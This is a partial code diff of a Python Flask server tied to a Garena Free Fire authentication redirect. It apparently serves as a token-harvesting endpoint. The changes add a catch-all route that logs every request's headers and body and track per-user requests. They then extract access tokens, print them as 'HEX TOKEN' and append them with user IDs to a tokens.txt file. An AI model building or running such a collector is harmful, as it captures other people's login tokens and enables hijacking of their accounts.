@@ -16,14 +16,29 @@ REDIRECT_URI = "https://api.ff.garena.co.id/auth/auth/callback_n?site=https://ap
 active_users = []
 # ─────────────────────────────────────────────────────────────────
 
-@app.route('/user/<user_id>/', defaults={'subpath': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
-@app.route('/user/<user_id>/<path:subpath>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
-def handle_request(user_id, subpath):
-    # Log everything
-    print(f"\n🔹 {request.method} /user/{user_id}/{subpath}")
+@app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
+@app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
+def catch_all(path):
+    print(f"\n🔹 {request.method} /{path}")
     print(f"   Headers: {dict(request.headers)}")
+    print(f"   Query: {request.args}")
+    print(f"   Raw body (first 200): {request.get_data()[:200]}")
 
-    # Track user
+    # If it's a request to /user/<user_id>/... we handle it separately
+    if path.startswith('user/'):
+        # Parse user_id and subpath from the path
+        parts = path.split('/')
+        if len(parts) >= 2:
+            user_id = parts[1]
+            subpath = '/'.join(parts[2:]) if len(parts) > 2 else ''
+            return handle_user_request(user_id, subpath)
+
+    # For root or other paths, return a success JSON
+    return jsonify({"status": "success", "message": "OK"}), 200
+
+def handle_user_request(user_id, subpath):
+    print(f"\n🔹 User: {user_id}, Subpath: {subpath}")
+
     if user_id not in active_users:
         active_users.append(user_id)
         print(f"👤 New user: {user_id}")
@@ -59,7 +74,6 @@ def handle_request(user_id, subpath):
                 hex_token = token_data.get('access_token')
                 if hex_token:
                     print(f"🎯 HEX TOKEN: {hex_token}")
-                    # Save to file
                     with open("tokens.txt", "a") as f:
                         f.write(f"{datetime.now()} | {user_id} | {hex_token}\n")
             except Exception as e:
